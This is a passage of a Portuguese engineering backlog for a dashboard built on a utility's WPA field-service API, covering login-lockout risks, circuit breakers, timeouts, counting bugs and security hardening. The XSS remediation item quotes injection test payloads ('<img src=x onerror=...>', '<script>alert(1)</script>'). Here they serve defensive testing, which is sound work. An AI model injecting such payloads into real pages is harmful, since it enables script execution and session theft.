  2. ⬜ Até lá, ao investigar falha intermitente em ES, verificar se o outro script
     rodou na janela.
- **AGRAVAMENTO (revisão paralela, 20/08/2026) — deixou de ser "volume alto" e
  passou a ser "eles podem BLOQUEAR a nossa conta ES sozinhos":**
  o `monitor_stc_es.py` refaz login **por item, sem limite**. Em `:225-227` um
  401/403 chama `relogin()`; o `login_wpa()` levanta `RuntimeError` se o status
  não for 200 (`:179-182`); e esse erro é engolido pelo `except Exception` de
  **cada laço por item** (`:744-748`, `:840-845`, `:923-927`, `:977-980`,
  `:1097-1100`), todos com `continue`. Ou seja: se a conta bloquear (ou a senha
  mudar), o script continua iterando a janela de 15 dias e tenta um `POST
  /signin` novo **para cada nota** — centenas a milhares de tentativas falhas
  numa única execução, na conta `clarissa.alves` que serve DESG/DESC/DEPT
  (`wpaService.js:51`, `:64-66`). O nosso breaker (P1-20) **não protege disso**:
  quem queima o orçamento de tentativas é o processo deles.
  Para contraste, o `import_wpa_es.py` loga **uma vez** e nunca reloga (`:933`) —
  seguro nesse aspecto; o preço é que, se o token expira no meio, as etapas
  restantes falham em silêncio e as tabelas ficam parciais sem erro.
  - ⬜ **Avisar o autor com prioridade:** cap de relogins por execução (ex.: 2) e
    abortar o pipeline em erro de login, em vez de `continue`.
  - ⬜ Do nosso lado: tratar bloqueio de conta como cenário **esperado**, não
    excepcional (P1-29, P1-32).
- **Relacionado:** P1-20, P1-22, P1-29, P1-32, P2-30.

---

## P1-26 — "Equipe não logou" não cruza com a escala do dia (falso positivo diário)

- **Categoria:** Dados / Operação
- **Status:** pending
- **Evidência:** `routes/index.js` (~1510-1521) monta `teams_missing_today`
  iterando a **whitelist inteira** e marcando como faltante quem não está em
  `teams_current`:
  ```js
  for (const e of oficGua) {
    if (!loggedSiglas.has(e.sigla.toUpperCase())) missing.push({...});
  }
  ```
  Não há cruzamento com escala. **Equipe de folga/férias/afastamento aparece como
  "não logou"** — falso positivo todo dia.
- **A solução que os scripts mostram:** `GET /collaboratorshifts/{setor}/{mes}/{ano}`
  dá a escala por dia, e a lista de códigos que **não são dia trabalhado**:
  `FOL, DR, DES, FER, DIS, AFO, NA, SAV, SIN, TRE` (constante `ESCALA_EXCLUIR`).
  Com isso, "não logou" passa a significar **estava escalada e não logou**.
- **Por que importa além do health:** é a regra de desvio nº 1 de qualquer sistema
  de alerta ("equipe não iniciou o turno"). Sem cruzar com escala, o alerta é ruído.
- **Ação:** ⬜ coletar `collaboratorshifts`, aplicar `ESCALA_EXCLUIR`, usar a escala
  do dia como denominador do "não logou" (health + futuro alerta).
- **Relacionado:** P1-1, P2-15.

---

## P1-23 — `/Notes/{id}/historic`: posse da nota por equipe (hoje é inferência)

- **Categoria:** Dados (produção reportada à EDP)
- **Status:** pending — investigar antes de mexer em número
- **Fonte:** revisão de dois scripts Python de outro projeto sobre a mesma API WPA
  (`import_wpa_es.py` e `monitor_stc_es.py`, 14/08/2026). O segundo usa um
  endpoint que **não conhecíamos**.
- **O endpoint:** `GET /api/Notes/{noteId}/historic` → lista de janelas com
  `Team.Name`, `CreatedAt`, `RemovedAt`. Ou seja: **qual equipe detinha a nota
  em cada intervalo de tempo**. O script usa pra reatribuir a equipe de cada
  evento conforme quem tinha a nota no instante do evento.
- **Por que importa:** a regra do José (31/07) — "conta como executada só pra quem
  finalizou 100%" — hoje é implementada por **inferência**: casamos nota × equipe
  × dia usando `session_date`/`_effDate`/`_notaDate`, com todas as armadilhas que
  isso trouxe (P1-15 chave Date × string, P1-16 dia da SESSÃO × dia da NOTA,
  P1-14 vira-noite). Com `historic`, posse deixa de ser dedução e passa a ser
  **consulta**: a conclusão caiu na janela da equipe X ⇒ é produção de X.
- **O que pode simplificar/resolver:**
  - **P1-16** — o casamento por dia da sessão vs. dia da nota deixa de ser
    necessário (a janela de posse é explícita).
  - **P2-13** — atribuição determinística por janela em vez de upsert por
    (date, team, tipo) com visão parcial.
  - O caso mais delicado: nota **rejeitada por uma equipe e executada por outra**.
- **⚠️ Custo:** 1 requisição **por nota**. Inviável pra todas. Caminho proposto:
  buscar `historic` só das notas **em disputa** (que aparecem em >1 equipe, ou
  rejeitadas-e-refeitas) — hoje já sabemos identificá-las
  (`scripts/diag-notas-multi-equipe.js`).
- **Ação:**
  1. ⬜ Chamar `historic` nas 2 notas já validadas no portal (`030009946354`,
     `030009957459`) e conferir se a janela de posse casa com o que o portal mostra.
  2. ⬜ Rodar nas notas multi-equipe de julho e comparar a atribuição atual × a
     que o `historic` indica. **Medir a diferença ANTES de mudar qualquer coisa.**
  3. ⬜ Só com número medido e revisado, decidir se vira fonte de verdade.
- **⚠️ Regra da casa:** mexe em número reportável à EDP → medir, validar no
  portal, revisar com o José, e só então aplicar. Ver P1-15/P1-16.
- **Relacionado:** P1-14, P1-15, P1-16, P2-13.

---

## P1-27 — Histórico multi-dia: um Set único para os 3 buckets, e dedup por CÓDIGO em vez de UUID

- **Categoria:** Dados / Leitura
- **Status:** código done (21/08/2026) — 7 testes
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `db/queries.js:367` cria o acumulador
  `{ conc: [], exec: [], rej: [], codigos: new Set() }` e os três laços seguintes
  (`:371`, `:378`, `:388`) compartilham **o mesmo** `codigos`. Quem chegar
  primeiro na ordem `captured_at DESC` "consome" o código.
- **Impacto:** só no caminho de **range multi-dia** (`getTeamsByDateFromSnapshots`,
  usado por `/api/teams/historico`, `routes/index.js:304`). O caminho
  `isSingleDay` (`db/queries.js:311`) está limpo. Nota concluída **e** rejeitada
  entra em um bucket só, sorteado pela ordem dos snapshots: se cair em `conc`,
  conta como produção e desaparece de "OS Rejeitadas"; se cair em `rej`, a
  produção subconta. É o bug de 20/07/2026 reaparecendo num caminho de leitura
  que a correção não cobriu.
- **Agravante:** o dedup é por `n.codigo || n.code`, não por UUID. O portal WPA
  exibe linhas duplicadas (fato validado na conferência de julho) e a regra da
  casa é contar por UUID.
- **Ação:** ⬜ um Set por bucket (`codConc`, `codExec`, `codRej`); dedup por
  `n.id` com `codigo` só como fallback; aplicar a mesma exclusão
  rejeitada>concluída do caminho single-day.
- **Critério de aceite:** teste com 2 snapshots onde a mesma nota está em
  `notasConcluidas` e `notasRejeitadas` → aparece nos dois buckets do retorno, e
  a produção do range é igual à soma das produções dos dias individuais.
- **Esforço:** 2h (função isolada) + 1h de teste.
- **Rollback:** trivial, uma função.
- **Relacionado:** P1-15, P1-16, P2-11.

---

## P1-28 — Checkpoints usam `RegisteredAt2`, contra a regra escrita 15 linhas acima na mesma função

- **Categoria:** Dados / Frontend
- **Status:** done (21/08/2026) — 5 testes
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/notaProcessor.js:110-125` estabelece a regra, com o
  probe de 08/06/2026 citado: *"Campos VINDOS DO APP MÓVEL (Conclusion,
  Timestamp, **cp.TimeStamp**): a versão 2 está CORROMPIDA — a EDP cola '-03:00'
  no fim da string UTC sem converter o valor"*. E `conclusao` (`:125`) obedece:
  `_normTz(nota.ConclusionDate)  // NUNCA usar ConclusionDate2 — corrompido`.
  Mas os checkpoints fazem o oposto, em dois lugares:
  ```js
  // notaProcessor.js:38 — ordenação
  .sort((a, b) => new Date(a.RegisteredAt2 || a.TimeStamp) - new Date(b.RegisteredAt2 || b.TimeStamp))
  // notaProcessor.js:48 — valor persistido no cache
  timestamp: cp.RegisteredAt2 || _normTz(cp.TimeStamp),
  ```
- **Impacto — depende da variante que a API manda, e nas duas está errado:**
  - se `RegisteredAt2` vier no formato BR (`"11/05/2026 14:23:45"`, como
    `docs/WPA-EDP-KNOWLEDGE-BASE.md:1158` registra): `new Date()` lê M/D, então
    **dia 13 a 31 vira `Invalid Date`** → ordenação de checkpoints é no-op
    (o comentário "Checkpoints ordenados cronologicamente" fica falso), a rota
    do Mapa sai fora de ordem, e `dispMin`/`execMin` viram `NaN` — o guard de
    render é `!== null` e `NaN !== null` é `true`, então o card imprime
    `🚗 NaNmin`;
  - se vier ISO com offset falso (o que o probe viu em `ConclusionDate2`):
    **+3h em todo checkpoint** — exatamente o bug que `conclusao` já corrigiu.
- **Ação:** ⬜ inverter para `_normTz(cp.TimeStamp) || cp.RegisteredAt2`,
  alinhando com a regra já escrita; ⬜ 1 probe em
  `/api/Notes/{id}/details/optimized` para registrar o formato atual no
  comentário datado; ⬜ avaliar um helper único de data (o
  `converter_data_robusta` deles é o modelo) que resolveria isto, a sentinela
  `0001-01-01` do P2-17 e o `ConclusionDate2` de uma vez.
- **Critério de aceite:** checkpoint de nota do dia 15+ ordena corretamente e o
  card de deslocamento mostra minutos, não `NaN`.
- **Esforço:** 1h + probe.
- **Rollback:** duas linhas.
- **Relacionado:** P2-17 (sentinela `0001-01-01`), P1-14.

---

## P1-29 — Circuit breaker é em memória: restart do PM2 zera e um crash-loop queima os 5 logins (furo no P1-20)

- **Categoria:** Ops / Backend
- **Status:** código done (21/08/2026) — breaker em app_settings; RUNBOOK atualizado
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:**
  - `services/wpaService.js:141` — `const _breaker = new Map()`, em memória por
    decisão documentada em `:143-145`.
  - `services/cronService.js:1179` — `setTimeout(runTokenRefresh, 2000)` no boot
    → `runTokenRefresh` chama `forceRefresh()` (`cronService.js:97`), que vai
    direto ao `login()` e **pula o `getToken()`** (`wpaService.js:399-445`), isto
    é, ignora o cache em memória **e** o cache no banco. Todo boot faz um
    `/signin` fresco obrigatório.
  - `ecosystem.config.js:9-11` — `autorestart: true`, `max_memory_restart: '1G'`,
    e o comentário datado registrando que *"pm2 reiniciou 161x num dia"*.
- **Impacto:** credencial errada no `.env` + crash-loop = 5 logins em segundos,
  com o breaker recém-zerado a cada boot. É **literalmente o incidente da conta
  do Ismael** (13/08), e o comentário do P1-20 (`wpaService.js:61-63`,
  *"no máximo 1 tentativa por janela de cooldown — nunca chega às 5"*) **não vale
  sob restart**.
- **Ação:** ⬜ persistir o breaker em `app_settings` (chave
  `wpa_breaker_<conta>`, mesmo padrão do `snapshot_last_ok`) e consultá-lo em
  `login()` antes do primeiro `/signin`; ⬜ trocar o `runTokenRefresh` do boot
  por `getToken()` — só o cron periódico precisa de `forceRefresh`.
- **Critério de aceite:** com o breaker aberto e o processo reiniciado, o próximo
  boot **não** emite `/signin`; teste cobre "breaker persistido sobrevive a
  reinício simulado".
- **Esforço:** 3h + testes.
- **Rollback:** flag de env para voltar ao breaker só-memória.
- **Relacionado:** P1-20, P1-22, P1-32.

---

## P1-30 — `_lastSectorReport` é global e é sobrescrito por request concorrente (furo no P1-21)

- **Categoria:** Ops / Backend
- **Status:** done (21/08/2026) — 1 teste
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/dataService.js:537` (`let _lastSectorReport`),
  atribuído em `:586`, e **três `await` com I/O de banco depois dele**
  (`_enrichComEscalaELogonReal`, `_enrichConcluidasDeEncerradas`,
  `_enrichCarteiraInicial`, `:590-594`). O cron lê o global depois
  (`cronService.js:133-134`).
- **Impacto:** snapshot com DSSJ falhando (breaker aberto em `sp` e `sp2`);
  durante os enriquecimentos, um browser chama `/api/teams` com escopo GUA →
  esse `getTeams` sobrescreve o global com `{ok:['DESG','DEPT'], failed:[]}` →
  `snapshot_last_ok` grava `sectors_failed: []` e **não** emite
  `snapshot_partial`. **SJC fica ausente da coleta com marcador de saúde verde**,
  anulando exatamente o P1-21, entregue em 14/08. Variante pior: 0 equipes +
  report limpo → `_classifySnapshotOutcome` devolve `'empty'`
  (`cronService.js:87-91`) e uma queda real é registrada como "dia vazio".
- **Ação:** ⬜ `getTeams` retornar `{ teams, report }` (ou aceitar um objeto de
  saída) e o `runSnapshot` usar o report **daquela** chamada. Não usar estado de
  módulo para dado por-chamada.
- **Critério de aceite:** teste com duas chamadas concorrentes a `getTeams` com
  escopos diferentes → cada uma recebe o próprio report.
- **Esforço:** 2h + testes.
- **Rollback:** manter o global como espelho durante uma release.
- **Relacionado:** P1-21, P1-22, P1-3.

---

## P1-31 — Nenhum `fetch` da WPA tem timeout, e o `_singleFlight` nunca solta a promise pendurada

- **Categoria:** Ops / Backend
- **Status:** done (21/08/2026)
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/wpaService.js:264-271` (`/identity/signin`) e
  `:512-519` (`wpaFetch`) — nenhum `timeout`, nenhum `signal`. O padrão existe no
  repo: `services/osrmService.js:106` usa `timeout: 15000`, e o `node-fetch@2`
  já suporta. O `_singleFlight` (`wpaService.js:1181-1187`) só remove a entrada
  no `.finally()`.
- **Impacto:** promise que nunca resolve = `_inflightSector.get(sectorId)` fica
  pendurada **para sempre**, e todo `getTeams`/`/api/teams`/snapshot daquele
  setor passa a aguardar a mesma promise morta. Um socket derrubado pelo Fortinet
  sem FIN trava o painel para todos os usuários até `pm2 restart` — e o
  `snapshot_last_ok` congela, mas `snapshots` ainda tem linhas recentes, então o
  `health-check.js:56-60` só acusa 30 min depois.
- **Ação:** ⬜ `timeout: Number(process.env.WPA_HTTP_TIMEOUT_MS) || 20000` nos
  dois `fetch`; ⬜ conferir que o timeout rejeita a promise do `_singleFlight`
  (o `.finally()` então limpa sozinho).
- **Critério de aceite:** teste com servidor que aceita a conexão e nunca
  responde → `wpaFetch` rejeita em ≤20s e o setor volta a ser consultável.
- **Esforço:** 1h.
- **Rollback:** variável de ambiente.
- **Relacionado:** P1-21, P1-29, P2-22.

---

## P1-32 — `_classifyLoginError` é fail-open: mensagem nova da EDP = breaker nunca abre

- **Categoria:** Ops / Backend
- **Status:** done (21/08/2026) — 5 testes
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/wpaService.js:150-158` — dois regexes em português;
  qualquer outra coisa devolve `{kind:'other'}`. E `:186-188`:
  `if (cls.kind === 'other') return null` → o breaker **não abre**.
- **Impacto:** se a EDP trocar o texto ("Senha incorreta", "Too many attempts")
  ou passar a responder 429/HTML no `/signin`, cada trigger independente
  (snapshot */15, cron de token, notas xx:05, `/api/teams` de cada browser,
  classifier) gasta uma tentativa. É a reprodução literal do incidente de 13/08,
  com a proteção inteira apoiada numa string **que a EDP controla**.
- **Ação:** ⬜ inverter o default: contar falhas não-transientes consecutivas por
  conta e abrir cooldown curto (15-30 min) a partir da 2ª, independente da
  mensagem; manter os cooldowns longos para os casos classificados.
  `kind:'other'` deixa de ser "não abre" e passa a ser "abre curto".
- **Critério de aceite:** teste com mensagem de erro desconhecida → breaker abre
  na 2ª falha.
- **Esforço:** 2h + testes.
- **Rollback:** o comportamento novo é mais restritivo; reverter = voltar o
  `return null`.
- **Relacionado:** P1-20, P1-29.

---

## P1-33 — `/Notes/{id}/completeInterruptions`: motivo de rejeição uniforme + a chave que falta ao P0-8

- **Categoria:** Dados
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido: **zero referências** ao
  endpoint no repo (`grep -rn completeInterruptions` = 0).
- **Evidência (script do outro projeto):** `import_wpa_es.py` chama
  `GET /api/Notes/{id}/completeInterruptions` (sem nenhum query param) e lê
  `Id`, `TeamName`, `Date`, `Notes`, `Try`, `RejectionReasonId`.
- **Por que é o achado mais alavancado da revisão — resolve dois problemas:**
  1. **motivo de rejeição uniforme para todos os tipos**, 1 request, sem
     `sectorId`. Hoje o `services/rejectionService.js:22-24` documenta em texto
     que `DL`, `LE` e `RL` têm *"endpoint desconhecido"* e grava
     `motivo_codes: []` (`:31-33`), enquanto o fallback tenta até 9 caminhos por
     nota para `DL` (`:80-92`);
  2. o `Id` da interrupção e o `Try` são exatamente a **chave composta** que o
     P0-8 precisa para representar "nota rejeitada por 2 equipes".
- **Não é duplicata do P1-24:** aquele é o `Interruptions[]` que já vem no
  `details/optimized` e traz só `Date`/`Try`/`Notes` — **sem id de motivo**.
- **Ação:** ⬜ 1 probe numa nota DL rejeitada conhecida para registrar o formato
  de `RejectionReasonId` (código tipo `"0101|0031"` ou UUID?) e se ele casa com
  o catálogo que já lemos em `rejectionService.js:126-139`; ⬜ se casar, trocar o
  fallback de 9 endpoints por 1 chamada; ⬜ usar `Id`/`Try` na PK do P0-8.
- **Critério de aceite:** nota DL rejeitada passa a ter `motivo_codes` populado.
- **Esforço:** probe 30min · integração 3-4h.
- **Rollback:** manter o fallback atual como segunda tentativa.
- **Relacionado:** P0-8, P1-24, P2-31.

---

## P1-34 — `_reconstruirDeslogada` não aplica a regra rejeitada>concluída

- **Categoria:** Dados / Frontend
- **Status:** done (21/08/2026) — 3 testes
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `db/queries.js:1310-1317` monta
  `executadas = conc.length` sem passar pelo filtro de exclusão; o front consome
  cru em `public/index.html:6958-6959` e `:7038-7039` quando `t.deslogada`.
- **Impacto:** equipe que não logou hoje, com 12 concluídas na última sessão das
  quais a EDP rejeitou 3 → o card mostra **12 executadas + 3 rejeitadas**, a
  mesma nota nos dois contadores, enquanto uma equipe logada na mesma situação
  mostraria 9. Pior: os chips por subcategoria (`public/index.html:6939`) usam
  `_notasConcluidasReais(t)` e filtram por range, então dão ~0 enquanto o
  contador diz 12 — quebrando o "chips batem por construção" afirmado em `:6937`.
  **Não vaza para a EDP** (o agregado de KPIs exclui deslogadas, `:6802`), mas é
  número visível divergindo de si mesmo no mesmo card.
- **Ação:** ⬜ aplicar o mesmo Set de exclusão em `_reconstruirDeslogada`;
  ⬜ passar `metrics.subcatCont` pronto (sem filtro de range) para os chips.
- **Critério de aceite:** card de equipe deslogada com nota concluída+rejeitada
  mostra 11 executadas + 1 rejeitada, e os chips somam 11.
- **Esforço:** 2h.
- **Rollback:** trivial.
- **Relacionado:** P1-15, P1-16, P1-27.

---

# P2 — Média prioridade (2 meses)

## P2-1 — Testes de contrato de rota (login, scope, health)

- **Categoria:** Qualidade
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de qualidade + backend 2026-07-08
- **Evidência:** `test/` não tem nenhum arquivo cobrindo `routes/*.js`.
  Composição `compatRegionalParam → applyScope → handler` nunca é
  exercitada ponta a ponta.
- **Impacto:** Uma rota que esqueça o middleware `applyScope` vaza dados
  de outra regional silenciosamente. Nenhum teste hoje pegaria.
- **Ação:**
  1. Exportar `app` de `server.js` sem chamar `.listen()`. Chamar `listen(0)`
     no `before()` do teste (porta aleatória).
  2. Criar `test/routes.test.js` com `fetch` nativo do Node contra
     `http://127.0.0.1:${port}`.
  3. Cobrir:
     - `POST /api/auth/login` com credencial errada → 401
     - `POST /api/auth/login` OK → 200 com token
     - `GET /api/teams` sem token → 401
     - `GET /api/teams?regionals=SJC` com token GUA → 403 ou array
       filtrado só de GUA
     - `GET /health` → JSON válido (após P1-2)
- **Aceite:** 5+ testes de rota, todos verdes. ✓ (17 testes em `test/routes.test.js`)
- **Esforço:** 1-2 dias.
- **Rollback:** Trivial (testes novos).
- **Depende de:** P1-2.
- **Feito em:** 22/07/2026. `test/routes.test.js` (criado 14/07 como "adianta
  P2-1") já cobria login (401/200 + regionals[]/v=2), guard sem token, escopo
  regional (403 pra `?regionals` fora do token + recorte por regional), P0-5,
  SSRF (P1-4) e rate-limit (P1-5). Hoje fechei os 2 bullets literais que
  faltavam: **`GET /api/teams`** (sem token → 401; `?regionals=SJC` com token
  GUA → 403 via applyScope) e **`GET /health`** (JSON válido, shape
  `{ok,ts,db}`, invariante `status ⟺ ok` e `db:error ⟹ !ok`; robusto com e sem
  Postgres). Total: **17 testes de rota**, todos verdes. Suíte 249/249.

## P2-2 — Extrair matemática de buckets em módulo único

- **Categoria:** Dados
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de pipeline 2026-07-08 (admitido em comentário do
  próprio código).
- **Evidência:** `services/dataWriter.js:592-596` — comentário: "Mesma
  matemática do `_buildDiaSummary` (dataService.js)". Duas cópias da
  prioridade `concluida > rejeitada > andamento > atual` + cálculo de
  canceladas/entradas em `dataWriter.js:658-669` e `dataService.js:313-347`.
- **Impacto:** Mudança de regra num lugar e não no outro = histórico
  persistente (`team_daily_carteira`) divergindo do summary ao vivo.
  Bug de 11/06 (canc=904/294) foi exatamente disso.
- **Ação:**
  1. Criar `services/carteiraMath.js`:
     ```js
     module.exports = { classifyBuckets, computeSummary };
     // classifyBuckets(inicial:Set, atualRaw:Set, andamentoRaw:Set,
     //                 concluidasRaw:Set, rejeitadasRaw:Set) → {
     //   atual:Set, andamento:Set, concluidas:Set, rejeitadas:Set,
     //   canceladas:Set, entradas_novas:Set
     // }
     ```
  2. Refatorar `dataService.js:_buildDiaSummary` e `dataWriter.js:upsertTeamDailyCarteira`
     pra usar `classifyBuckets`.
  3. Criar `test/carteiraMath.test.js` (função pura, fixtures simples).
- **Aceite:** Um único ponto de mudança pra regra de bucket. Testes verdes. ✓
- **Esforço:** meio dia.
- **Rollback:** Reverter commit (função pura, sem efeito colateral).
- **Depende de:** P0-3 (testes cobrindo o comportamento atual antes de
  refatorar).
- **Feito em:** 22/07/2026.
  - Criado `services/bucketMath.js` com `classifyBuckets({inicial, atual,
    andamento, concluidas, rejeitadas})` → contagens `{inicial, atual,
    andamento, concluidas, rejeitadas, canceladas, entradas_novas}`. É a FONTE
    ÚNICA da prioridade `rejeitada > concluída > andamento > atual` + cálculo de
    canceladas/entradas. (Nome ficou `bucketMath`, não `carteiraMath` como o
    plano sugeria — mais descritivo do que faz.)
  - `dataService._buildDiaSummary` (ao vivo) e
    `dataWriter.upsertTeamDailyCarteira` (histórico) agora **chamam a mesma
    função** — a duplicata que causou o bug de 11/06 (canc 904 vs 294) sumiu.
    Comentários datados da prioridade (20/07, ECTSJ83) preservados nos dois
    call-sites.
  - **Comportamento preservado** (refactor mecânico): os testes existentes
    `diaSummary` e `dataWriter` — que assertam as contagens de saída — seguem
    verdes sem alteração. +13 testes novos em `test/bucketMath.test.js`
    (prioridade, dedup, canceladas/entradas, caso ECTSJ83, e a INVARIANTE
    `atual+andamento+concluidas+rejeitadas+canceladas = inicial + entradas_novas`
    em 5 cenários). Suíte 262/262.
  - **Correção de doc:** o comentário antigo em `dataService` afirmava a
    invariante `inicial = ... + entradas_novas` (imprecisa/errada — off por
    `entradas`); o correto (o que o código sempre fez) está documentado em
    `bucketMath.js` e travado em teste.
  - **Deploy:** só código (services), sem migração. `git pull` + PM2.

## P2-3 — `public/` dedicado (parar de servir raiz do repo)

- **Categoria:** Segurança / Frontend
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de backend + frontend + segurança 2026-07-08
- **Evidência:** `server.js:74` — `app.use(express.static(path.join(__dirname)))`
  serve raiz inteira: `server.js`, `services/*`, `ecosystem.config.js`,
  `logs/`, `CHECKPOINT.md`. `.env` protegido só pelo default `dotfiles:'ignore'`.
- **Impacto:** Qualquer pessoa na rede lê código-fonte, logs operacionais
  e detalhes de infra sem autenticação.
- **Ação:**
  1. Criar `public/` na raiz.
  2. Mover `index.html`, `vendor/`, `logo.*` pra `public/`.
  3. `server.js:74` → `app.use(express.static(path.join(__dirname, 'public')))`.
  4. `server.js:77` → `sendFile(path.join(__dirname, 'public', 'index.html'))`.
- **Aceite:**
  - [x] `curl http://localhost:3002/server.js` retorna 404. (travado em `test/routes.test.js`)
  - [x] `curl http://localhost:3002/logs/out.log` retorna 404.
  - [x] Painel continua funcionando normalmente. (`GET /` → 200 HTML, testado)
- **Esforço:** 1-2h.
- **Rollback:** Reverter commit (mover arquivos de volta).
- **Depende de:** nada, mas coordena bem com P3-2 (split do frontend).
- **Feito em:** 22/07/2026.
  - Criado `public/` e movidos (via `git mv`, preserva histórico):
    `index.html`, `vendor/`, `logo.png`, `logo.svg`. `server.js` agora faz
    `express.static(__dirname/'public')` (era `__dirname` inteiro) — a raiz do
    repo (server.js, services/, db/, logs/, migrations/, `.env`…) **deixou de
    ser servível por HTTP**. Assets do cliente usam caminhos relativos
    (`vendor/…`, `logo.png`) que resolvem do `public/`.
  - Catch-all endurecido: SPA-fallback só pra rotas SEM extensão; caminho COM
    extensão que não existe no `public/` retorna **404** (antes o `*` devolvia
    o HTML com 200 pra qualquer coisa — `/server.js` viraria 200-HTML). Assim
    `/server.js`, `/logs/*.log`, `/services/*.js` dão 404 de verdade.
  - +4 testes em `test/routes.test.js` (server.js/logs/services → 404; `/` →
    200 HTML). Suíte 266/266. CLAUDE.md atualizado (`public/index.html`,
    `public/vendor/`).
  - **Nota:** `vercel.json` (legado) ainda referencia `logo.png` na raiz —
    intocado de propósito (Vercel está sendo aposentado, P3-8/Fase 4; prod é
    VM/PM2). `Cabeçalho Engelmig Energia.png` (órfão) ficou na raiz e agora
    simplesmente não é mais servido.
  - **Deploy:** código + arquivos movidos, sem migração de dados. `git pull` +
    PM2. Após subir, confira: `curl -sI http://172.25.3.154:3002/server.js`
    deve dar `404`, e `curl -sI http://172.25.3.154:3002/` deve dar `200`.

## P2-4 — Escapar dados EDP em `innerHTML`

- **Categoria:** Segurança / Frontend
- **Status:** **done** (22/07/2026) — ver "Feito em" no fim do item.
- **Fonte:** Auditoria de segurança + frontend 2026-07-08
- **Evidência:** 133 usos de `innerHTML` em `index.html`. `escapeHtml`
  usado só 13 vezes e definido **em duplicidade** (`index.html:5862` e `:7327`).
  Dados da API WPA (endereço, nome de OS, comentário) entram crus. JWT em
  `localStorage` (`index.html:5406`) — XSS = roubo de sessão.
- **Impacto:** Dado da EDP contendo `<img src=x onerror=...>` executa JS.
  Baixa probabilidade (dados operacionais raramente têm markup), mas
  vetor real.
- **Ação:**
  1. Deletar uma das definições duplicadas de `escapeHtml`, deixar uma
     global no topo do `<script>`.
  2. Aplicar em pontos identificados como críticos:
     - `index.html:10618-10619` (nome/cargo de colaborador)
     - `index.html:10857-10871` (cliente.nome, endereco.logradouro, texto
       da OS)
     - `onclick` construídos com interpolação: usar `data-*` attributes +
       listener delegado (mata os `${...}` em atributo).
  3. Adicionar CSP restritivo em `server.js`:
     `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';`
     (unsafe-inline ainda necessário porque tem onclick inline; remover
     depois do P3-2).
- **Aceite:**
  - [x] `escapeHtml` definido 1 vez, usado em pontos críticos.
  - [x] Payload de teste com `<script>alert(1)</script>` no nome de OS
    renderiza como texto.
  - [x] Header CSP presente em resposta.
- **Esforço:** meio dia.
- **Rollback:** Reverter commit.
- **Depende de:** nada.
- **Feito em:** 22/07/2026.
  1. `escapeHtml` agora tem **1 única definição** (global hoisted em
     `index.html:7328`). A duplicata local do IIFE `MultiSelect` (antigo
     `:5862`) foi removida — os call-sites do IIFE (`refresh()`) resolvem pra
     global por hoisting + execução diferida (comentário no lugar explica).
  2. `escapeHtml()` aplicado nos pontos críticos de free-text da EDP:
     `nota.comentarios`; bloco cliente/endereço (nome, unidade, telefone,
     tensão, tarifa, logradouro, bairro, cidade, CEP); modal e histórico de
     colaborador (nome, cargo, matrícula); logradouro na aba Mapa; observação
     e `team_name` da rejeição. Coordenadas em `href` de mapa via
     `encodeURIComponent`. Total: 23 usos.
  3. **CSP + headers de segurança** em `server.js` (middleware após `cors()`).
     O CSP ficou **mais amplo** que o mínimo do plano original, de propósito,
     pra NÃO quebrar produção — libera só os hosts externos legítimos
     validados por grep: tiles Leaflet (`*.tile.openstreetmap.org` em
     `img-src`), proxy OSRM (`osrm-proxy.jose-zouain.workers.dev` em
     `connect-src`), e `data:` (ícones/logos base64 + fotos WPA em `img-src`).
     `'unsafe-inline'` em script/style continua necessário (onclick e estilos
     inline do monólito) — só remove depois do P3-2. Também setados
     `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`.
  - **Nota (dívida remanescente):** a ação (3) do plano — trocar `onclick`
    interpolado por `data-*` + listener delegado — **não** foi feita; é
    refactor grande do monólito e fica acoplada ao **P3-2**. O escaping cobre
    o vetor de dados; a CSP com `'unsafe-inline'` é o mitigador até lá.
  - **Deploy:** só código (`index.html` + `server.js`), sem migração. Após
    `git pull`, reiniciar PM2 (`delete + start`) e conferir o header CSP na
    resposta (`curl -sI https://<painel>/ | grep -i content-security`).

## P2-5 — Tie-breaker `.order('id')` em queries paginadas

- **Categoria:** Dados
- **Status:** **done** (22/07/2026) — ver "Feito em".
- **Fonte:** Auditoria de dados 2026-07-08
- **Evidência:** `db/queries.js:236`, `:622`, `:954` — paginam sobre
  `captured_at` DESC apenas. `dataWriter.js:45` insere ~60 equipes num
  único INSERT (mesmo `captured_at`). Postgres não garante ordem estável
  em empates.
- **Impacto:** Fronteira de página cai dentro de grupo empatado → linhas
  duplicam/somem entre páginas. Bug não-reproduzível que mina confiança
  em exports.
- **Ação:** Adicionar `.order('id')` como tie-breaker nas 3 queries
  (`pgShim.js` já suporta múltiplos `.order()`).
- **Aceite:** 3 queries com tie-breaker; testes de paginação verdes.
- **Esforço:** 30min.
- **Rollback:** Reverter (ordem instável volta).
- **Depende de:** nada.
- **Feito em:** 22/07/2026.
  - **Escopo REVISADO na execução (maior que o do plano, de propósito).** Ao
    validar, o `.order()` das 3 queries de `snapshots` era só a ponta: das **16
    factories** que passam por `_selectAll`, **10** ou não tinham `.order()`
    nenhum (paginar com `.range()` sem `ORDER BY` = ordem arbitrária entre
    páginas no Postgres → mesma classe de bug) ou ordenavam só por `date`
    (não-única). Várias dessas alimentam **agregados reportados à EDP**
    (`team_daily_totals`), então eram tão ou mais críticas que as de snapshot.
    Corrigir só 3 deixaria a classe aberta — contra a filosofia "aritmética
    por construção". Não corrigi em silêncio: está aqui e no commit.
  - **Fix por construção:** o tie-breaker foi centralizado no próprio
    `_selectAll(queryFactory, pageSize=1000, tieBreaker='id')` — ele aplica
    `.order(tieBreaker)` como ÚLTIMA chave em TODA página, garantindo ordem
    total estável em todas as 16 paginações de uma vez. PKs auditadas em
    `supabase/schema.sql`: `snapshots`, `team_daily_totals`,
